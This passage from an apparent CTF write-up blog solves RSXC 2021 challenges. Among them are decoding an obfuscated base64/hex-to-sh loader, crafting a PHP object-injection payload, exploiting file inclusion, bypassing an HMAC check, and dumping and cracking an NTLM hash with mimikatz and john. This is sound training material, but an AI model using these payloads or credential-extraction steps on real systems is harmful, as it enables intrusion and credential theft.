<span class="token assign-left variable">agrwa</span><span class="token operator">=</span>MD<span class="token punctuation">;</span><span class="token assign-left variable">afwanmdwaa</span><span class="token operator">=</span>Yy<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">"ZWNobyAweDIwNjM3NTcyNmMy"</span><span class="token variable">$agrwa</span><span class="token string">"Y4NzQ3NDcwM2EyZjJmNzI3Mzc4NjMyZTZlNm"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"Zj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzYz"</span><span class="token variable">$agrwa</span><span class="token string">""</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzMzNDY0MzI2MTY2NjM2NDM0NjIzMzM5MzUz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzQ2MzM2MzMzNDMxNjU2Nj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjMzMTMwNjM2ND"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"Mzcz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzczODMyNjMzNzMwNjIzMj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjYzODM5MzUz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzMz"</span><span class="token variable">$agrwa</span><span class="token string">"M1NjE2NDM5MzA2NT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjQzNTY2MmY2NjZjNjE2NzJlNzQ3ODc0M2IyMzU1NmM0ZTU5NTEzMzc0NDU2MjMyMzQ2ZTY0NDYzOTY5NjI0NzZjNzU1YTQ3NzgzNTU4MzM1Mjc5NjQ1ODRlMzA1ODMyMzk2OTVhNmU1NjdhNTkzMjQ2MzA1YTU3NTI2NjU5MzIzOTZiNWE1NjM5NzA2NDQ2Mzk3NDYxNTc2NDZmNjQ0NjM5NmI2MjMxMzk3YT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzIzMTZjNjQ0NzY4NzA2MjZkNjQ2NjU5NmQ0NjZiNjY1MTNkM2QzYjIzNTU2YzRlNTk1MTMzNzQ0NT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzIzNDZlNjQ0NjM5Njk2MjQ3NmM3NTVhNDc3ODM1NTgzMzUyNzk2NDU4NGUz"</span><span class="token variable">$agrwa</span><span class="token string">"U4MzIzOTY5NWE2ZTU2N2E1OTMyNDYz"</span><span class="token variable">$agrwa</span><span class="token string">"VhNTc1MjY2NTkzMjM5NmI1YTU2Mzk3"</span><span class="token variable">$agrwa</span><span class="token string">"Y0NDYzOTc0NjE1NzY0NmY2NDQ2Mzk2Yj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzEzOTdhNjIzMjMxNmM2NDQ3Njg3"</span><span class="token variable">$agrwa</span><span class="token string">""</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NmQ2NDY2NTk2ZDQ2NmI2NjUxM2QzZDBhIHwgeHhkIC1yIC1wIHwgc2gK"</span> <span class="token operator">|</span> base64 -d <span class="token operator">|</span> <span class="token function">sh</span></code><!-- HTML_TAG_END --></pre>
<p>Looking like we’re nearing the final steps as there is some commands piped into <code>sh</code>, I write the output into the final bash file <code>16-challenge3.sh</code> with some minor changes once again:</p>
<pre class="language-bash"><!-- HTML_TAG_START --><code class="language-bash"><span class="token comment"># 16-challenge3.sh</span>
<span class="token assign-left variable">agrwa</span><span class="token operator">=</span>MD<span class="token punctuation">;</span><span class="token assign-left variable">afwanmdwaa</span><span class="token operator">=</span>Yy<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">"ZWNobyAweDIwNjM3NTcyNmMy"</span><span class="token variable">$agrwa</span><span class="token string">"Y4NzQ3NDcwM2EyZjJmNzI3Mzc4NjMyZTZlNm"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"Zj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzYz"</span><span class="token variable">$agrwa</span><span class="token string">""</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzMzNDY0MzI2MTY2NjM2NDM0NjIzMzM5MzUz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzQ2MzM2MzMzNDMxNjU2Nj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjMzMTMwNjM2ND"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"Mzcz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzczODMyNjMzNzMwNjIzMj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjYzODM5MzUz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzMz"</span><span class="token variable">$agrwa</span><span class="token string">"M1NjE2NDM5MzA2NT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjQzNTY2MmY2NjZjNjE2NzJlNzQ3ODc0M2IyMzU1NmM0ZTU5NTEzMzc0NDU2MjMyMzQ2ZTY0NDYzOTY5NjI0NzZjNzU1YTQ3NzgzNTU4MzM1Mjc5NjQ1ODRlMzA1ODMyMzk2OTVhNmU1NjdhNTkzMjQ2MzA1YTU3NTI2NjU5MzIzOTZiNWE1NjM5NzA2NDQ2Mzk3NDYxNTc2NDZmNjQ0NjM5NmI2MjMxMzk3YT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzIzMTZjNjQ0NzY4NzA2MjZkNjQ2NjU5NmQ0NjZiNjY1MTNkM2QzYjIzNTU2YzRlNTk1MTMzNzQ0NT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzIzNDZlNjQ0NjM5Njk2MjQ3NmM3NTVhNDc3ODM1NTgzMzUyNzk2NDU4NGUz"</span><span class="token variable">$agrwa</span><span class="token string">"U4MzIzOTY5NWE2ZTU2N2E1OTMyNDYz"</span><span class="token variable">$agrwa</span><span class="token string">"VhNTc1MjY2NTkzMjM5NmI1YTU2Mzk3"</span><span class="token variable">$agrwa</span><span class="token string">"Y0NDYzOTc0NjE1NzY0NmY2NDQ2Mzk2Yj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzEzOTdhNjIzMjMxNmM2NDQ3Njg3"</span><span class="token variable">$agrwa</span><span class="token string">""</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NmQ2NDY2NTk2ZDQ2NmI2NjUxM2QzZDBhIHwgeHhkIC1yIC1wIHwgc2gK"</span> <span class="token operator">|</span> base64 -d</code><!-- HTML_TAG_END --></pre>
<p>Running this bash script gave a completely different output with a quite large hexadecimal piped into <code>xxd</code> and then <code>sh</code> for execution. Further running this command directly without executing (<code>| sh</code>) gives:</p>
<pre class="language-bash"><!-- HTML_TAG_START --><code class="language-bash">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">bash</span> <span class="token number">16</span>-challenge3.sh
<span class="token builtin class-name">echo</span> 0x206375726c20687474703a2f2f727378632e6e6f2f623630623334643261666364346233393530653463363334316566626331306364623730653738326337306232626638393530653330356164393065626435662f666c61672e7478743b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d3b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d0a <span class="token operator">|</span> xxd -r -p <span class="token operator">|</span> <span class="token function">sh</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> 0x206375726c20687474703a2f2f727378632e6e6f2f623630623334643261666364346233393530653463363334316566626331306364623730653738326337306232626638393530653330356164393065626435662f666c61672e7478743b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d3b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d0a <span class="token operator">|</span> xxd -r -p
 <span class="token function">curl</span> http://rsxc.no/b60b34d2afcd4b3950e4c6341efbc10cdb70e782c70b2bf8950e305ad90ebd5f/flag.txt<span class="token punctuation">;</span><span class="token comment">#UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ==;#UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ==</span></code><!-- HTML_TAG_END --></pre>
<p>The output seemed to be a navigation to the an url containing the flag, but opening the page gives us a 404 Not Found response. However, looking at the comments after the curl command we see some strings looking similar to an base64 encoded string. Decoding the comment gives us the flag:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token assign-left variable">UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ</span><span class="token operator">==</span> <span class="token operator">|</span> base64 -d
RSXC<span class="token punctuation">&#123;</span>Don't_blindly_trust_obfuscated_code_it_might_do_something_bad<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{Don&#39;t_blindly_trust_obfuscated_code_it_might_do_something_bad}</code></p>
<h2 id="day-17-my-xmas-card"><a href="#day-17-my-xmas-card">[DAY 17] My XMas card</a></h2>
<h3 id="challenge-16"><a href="#challenge-16">Challenge</a></h3>
<blockquote><p>We felt like it’s time to start sending out some XMas cards, maybe you find something you like?
<a href="http://rsxc.no:20017/" rel="noopener" class="text-link" target="_blank">http://rsxc.no:20017</a></p></blockquote>
<h3 id="solution-16"><a href="#solution-16">Solution</a></h3>
<p>Navigating to the page we are greeted with a Xmas card along with the lines of “Finding your card in /files”. This hint tells us that there exists a directory/path to <code>/files</code>. Going to that said directory, we can see that there are 3 files: <code>card.txt</code>, <code>index.php-1</code> and <code>flag.txt</code>. Guessing that the flag is in the <code>flag.txt</code> file, I get a forbidden error on opening it as I don’t have permission to access the resource. Looking at all the other files we see that the content of <code>card.txt</code> is loaded and read at <code>index.php</code>, and the source code could be seen in <code>index.php-1</code>:</p>
<pre class="language-php"><!-- HTML_TAG_START --><code class="language-php"><span class="token comment">// index.php</span>
file <span class="token operator">=</span> <span class="token constant">__DIR__</span><span class="token operator">.</span> <span class="token string double-quoted-string">"/files/"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">__DIR__</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Finding your card in /files"</span><span class="token punctuation">)</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"NO ðŸ˜ "</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'card'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'card'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$card</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'card'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token variable">$card</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Card</span><span class="token punctuation">;</span> <span class="token variable">$card</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'files/card.txt'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$card</span><span class="token operator">-></span><span class="token function">displayCard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><!-- HTML_TAG_END --></pre>
<p>Looking at the source code we can see that this challenge is about PHP Deserialization/Object Injection. By sending in an arbitrary base64 serialized <code>Card</code> object to the GET request input, the object is constructed and the method <code>displayCard()</code> is run. Knowing the vulnerability, solving the challenge has become as easy as creating my own class of <code>Card</code> and then serializing it:</p>
<pre class="language-php"><!-- HTML_TAG_START --><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Card</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">private</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Card</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Tzo0OiJDYXJkIjoxOntzOjEwOiIAQ2FyZABmaWxlIjtzOjg6ImZsYWcudHh0Ijt9</span>
<span class="token delimiter important">?></span></span></code><!-- HTML_TAG_END --></pre>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> http://rsxc.no:20017/?card<span class="token operator">=</span>Tzo0OiJDYXJkIjoxOntzOjEwOiIAQ2FyZABmaWxlIjtzOjg6ImZsYWcudHh0Ijt9
Finding your card <span class="token keyword">in</span> /files
RSXC<span class="token punctuation">&#123;</span>Care_needs_to_be_taken_with_user_supplied_input.It_should_never_be_trusted<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{Care_needs_to_be_taken_with_user_supplied_input.It_should_never_be_trusted}</code></p>
<h2 id="day-18-remember-the-flag-docker-remembers"><a href="#day-18-remember-the-flag-docker-remembers">[DAY 18] Remember the flag? Docker remembers</a></h2>
<h3 id="challenge-17"><a href="#challenge-17">Challenge</a></h3>
<blockquote><p>We found a docker image, but it seems that the flag has been removed from it, could you help us get it back?
<a href="https://rsxc.no/798d1de7d544fe090786f5930d137b863ff46dd19a018882ed2812a835517d1b/18-challenge.zip" rel="noopener" class="text-link" target="_blank">https://rsxc.no/798d1de7d544fe090786f5930d137b863ff46dd19a018882ed2812a835517d1b/18-challenge.zip</a></p></blockquote>
<h3 id="solution-17"><a href="#solution-17">Solution</a></h3>
<p>We are given a zip file containing a docker image. Usually what one would start with a challenge similar like this is to analyze the different commands and files found in dockerfile and container. However, after unzipping it and just simply running <code>strings</code> and greping for the flag on the uncompressed file gives us the flag in plaintext… Sometimes, solving a challenge can be as easy as just that.</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">unzip</span> <span class="token number">18</span>-challenge.zip
Archive:  <span class="token number">18</span>-challenge.zip
  inflating: Dockerfile
  inflating: docker-box.tar.gz
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">tar</span> -xzf docker-box.tar.gz
juki@izone:~/Desktop/ctf/rsxc2021$ strings docker-box.tar <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"RSXC"</span>
RSXC<span class="token punctuation">&#123;</span>Now_you_know_that_docker_images_are_like_onions.They_have_many_layers<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{Now_you_know_that_docker_images_are_like_onions.They_have_many_layers}</code></p>
<h2 id="day-19-the-inclusive-xmas-cards"><a href="#day-19-the-inclusive-xmas-cards">[DAY 19] The inclusive xmas cards</a></h2>
<h3 id="challenge-18"><a href="#challenge-18">Challenge</a></h3>
<blockquote><p>We felt that the our last xmas cards weren’t that inclusive. So we made even more options, so everyone has one that fits them!
<a href="http://rsxc.no:20019/" rel="noopener" class="text-link" target="_blank">http://rsxc.no:20019</a></p></blockquote>
<h3 id="solution-18"><a href="#solution-18">Solution</a></h3>
<p>Similar to the challenge from day 17, we are greeted with a page containing different xmas cards after navigting to the website. However, different from the previous challenge, there is no source code to be found at the directory <code>/files</code>. The only text files we could see was <code>flag.txt</code>, <code>santa.txt</code>, <code>snowmen.txt</code> and <code>tree.txt</code>. Again, we don’t have permission to open <code>flag.txt</code> just as last time.</p>
<p>Testing the application and opening the <code>xmas tree</code> card for instance, we see that we are directed to the url: <code>http://rsxc.no:20019/card.php?card=dHJlZS50eHQ=</code>, the same php file <code>card.php</code> as last time with the GET request of <code>?card=dHJlZS50eHQ=</code>. This time, the GET requests seems to be something that resembles a base64 encoded string. After trying to decode the base64, I could guess how the challenge could be solved as the encryption is just base64’ing the desired file input at the directory <code>/files</code>.</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token assign-left variable">dHJlZS50eHQ</span><span class="token operator">=</span> <span class="token operator">|</span> base64 -d
tree.txt</code><!-- HTML_TAG_END --></pre>
<p>Since we can control the GET request input of <code>card</code>, reading the flag is as easy as requesting for the file <code>flag.txt</code> encoded in base64:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -s http://rsxc.no:20019/card.php?card<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n <span class="token string">"flag.txt"</span> <span class="token operator">|</span> base64<span class="token variable">)</span></span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"RSXC"</span>
RSXC<span class="token punctuation">&#123;</span>It_is_not_smart_to_let_people_include_whatever_they_want<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{It_is_not_smart_to_let_people_include_whatever_they_want}</code></p>
<h2 id="day-20-easy-mistakes"><a href="#day-20-easy-mistakes">[DAY 20] Easy mistakes</a></h2>
<h3 id="challenge-19"><a href="#challenge-19">Challenge</a></h3>
<blockquote><p>When programming, it is easy to make simple mistakes, and some of them can have dire consequences.
<a href="http://rsxc.no:20020/" rel="noopener" class="text-link" target="_blank">http://rsxc.no:20020</a></p></blockquote>
<h3 id="solution-19"><a href="#solution-19">Solution</a></h3>
<p>Upon navigating to the site we are greeted with the source code of the challenge:</p>
<pre class="language-php"><!-- HTML_TAG_START --><code class="language-php">This is the code found in /api.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hmac'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"HTTP/1.0 400 Bad Request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SECRET"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$hmac</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"host"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"sha256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hmac</span> <span class="token operator">!=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hmac'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"HTTP/1.0 403 Forbidden"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></span></code><!-- HTML_TAG_END --></pre>
<p>Looking at the code we can see that the api path takes in two inputs as JSON body requests, <code>hmac</code> and <code>host</code>. Upon receiving the correct body input, it signs the <code>host</code> input with a secret using the hashing algorithm <code>sha256</code> and comparing the result with the <code>hmac</code> input. The flag is then outputted if these two values compared are the same. However, what the application did not take into consideration is that we have control over both the unsigned value that is to be signed, and the result of the signed. This means that sending in an empty value/string on both inputs, ie. signing an empty message results in an empty message, would give us the flag:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> --data <span class="token string">'&#123;"host":"", "hmac":""&#125;'</span> --header <span class="token string">'Content-Type: application/json'</span> http://rsxc.no:20020/api.php
RSXC<span class="token punctuation">&#123;</span>You_have_to_have_the_right_order_for_arguments<span class="token operator">!</span><span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{You_have_to_have_the_right_order_for_arguments!}</code></p>
<h2 id="day-21-nice-memories"><a href="#day-21-nice-memories">[DAY 21] Nice memories</a></h2>
<h3 id="challenge-20"><a href="#challenge-20">Challenge</a></h3>
<blockquote><p>Note: The flag is the clear text password for river-security-xmas user.
On a IR mission we found that the threatactor dumped lsass file.
Can you rock our world and find the flag for us?
<a href="https://rsxc.no/35a2c6961adc6886665363b6f47c3a156356a91a4cf602416b250aa4daca4167/21-challenge.zip" rel="noopener" class="text-link" target="_blank">https://rsxc.no/35a2c6961adc6886665363b6f47c3a156356a91a4cf602416b250aa4daca4167/21-challenge.zip</a></p></blockquote>
<h3 id="solution-20"><a href="#solution-20">Solution</a></h3>
<p>We are given a system dump of the lsass file. To make it easier for myself, as this was a Windows dump, I opted to use mimikatz on my Windows PC to dump the passwords from the memory dump file <code>lsass.DMP</code> instead of my usual linux setup <em>(this is due to not having an instance of kali linux ready)</em>.</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">$ .<span class="token punctuation"></span>mimikatz.exe

  <span class="token builtin class-name">.</span><span class="token comment">#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29</span>
 <span class="token builtin class-name">.</span><span class="token comment">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span>
 <span class="token comment">## /  ##  /*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com )</span>
 <span class="token comment">##  / ##       > https://blog.gentilkiwi.com/mimikatz</span>
 <span class="token string">'## v ##'</span>       Vincent LE TOUX             <span class="token punctuation">(</span> vincent.letoux@gmail.com <span class="token punctuation">)</span>
  <span class="token string">'#####'</span>        <span class="token operator">></span> https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz <span class="token comment"># sekurlsa::minidump lsass.DMP</span>
Switch to MINIDUMP <span class="token builtin class-name">:</span> <span class="token string">'lsass.DMP'</span>

mimikatz <span class="token comment"># sekurlsa::logonpasswords</span>
Opening <span class="token builtin class-name">:</span> <span class="token string">'lsass.DMP'</span> <span class="token function">file</span> <span class="token keyword">for</span> minidump<span class="token punctuation">..</span>.

Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">1304254</span> <span class="token punctuation">(</span>00000000:0013e6be<span class="token punctuation">)</span>
Session           <span class="token builtin class-name">:</span> Interactive from <span class="token number">2</span>
User Name         <span class="token builtin class-name">:</span> river-security-xmas
Domain            <span class="token builtin class-name">:</span> DESKTOP-V1MQH3P
Logon Server      <span class="token builtin class-name">:</span> WIN-QC6FTBKEEE9
Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2021</span>-11-12 <span class="token number">13</span>:29:30
SID               <span class="token builtin class-name">:</span> S-1-5-21-2640804858-4017698289-1413954960-1001
        msv <span class="token builtin class-name">:</span>
         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary
         * Username <span class="token builtin class-name">:</span> river-security-xmas
         * Domain   <span class="token builtin class-name">:</span> DESKTOP-V1MQH3P
         * NTLM     <span class="token builtin class-name">:</span> 7801ee9c5762bb027ee224d54cb8f62e
         * SHA1     <span class="token builtin class-name">:</span> bebad302f8e64b59279c3a6747db0e076800d9ca
<span class="token punctuation">..</span>.</code><!-- HTML_TAG_END --></pre>
<p>After getting the NTLM hash (<code>7801ee9c5762bb027ee224d54cb8f62e</code>) of the password for the user <code>river-security-xmas</code> through mimikatz. With the hint of <code>Can you rock our world and find the flag for us?</code>, hinting to the use of <code>rockyou.txt</code>, I bruteforced the password of this hash using <code>john-the-ripper</code> (a password cracking tool running on the CPU):</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token string">"7801ee9c5762bb027ee224d54cb8f62e"</span> <span class="token operator">></span> <span class="token builtin class-name">hash</span>
juki@izone:~/Desktop/ctf/rsxc2021$ john --format<span class="token operator">=</span>nt --wordlist<span class="token operator">=</span>/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>NT <span class="token punctuation">[</span>MD4 <span class="token number">128</span>/128 XOP 4x2<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: no OpenMP support <span class="token keyword">for</span> this <span class="token builtin class-name">hash</span> type, consider --fork<span class="token operator">=</span><span class="token number">4</span>
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
alliwantforchristmasisyou <span class="token punctuation">(</span>?<span class="token punctuation">)</span>
1g <span class="token number">0</span>:00:00:01 DONE <span class="token punctuation">(</span><span class="token number">2021</span>-12-21 <span class="token number">13</span>:08<span class="token punctuation">)</span> <span class="token number">0</span>.7462g/s 7621Kp/s 7621Kc/s 7621KC/s alliwantisy0oh<span class="token punctuation">..</span>allitaite10
Use the <span class="token string">"--show --format=NT"</span> options to display all of the cracked passwords reliably
Session completed</code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>alliwantforchristmasisyou</code></p>
<h2 id="day-22-wireless-communication"><a href="#day-22-wireless-communication">[DAY 22] Wireless communication</a></h2>
<h3 id="challenge-21"><a href="#challenge-21">Challenge</a></h3>
<blockquote><p>We tried to find a new way of sending the flag, and this time it is even encrypted! Since we are nice we will even give you a hint. The password starts with S. Can you Rock our world?
https:///rsxc.no/5512383c4c02768617233eefdd4f79efe5dea9d08a850c8414644abf296845cf/22-challenge.cap</p></blockquote>
<h3 id="solution-21"><a href="#solution-21">Solution</a></h3>
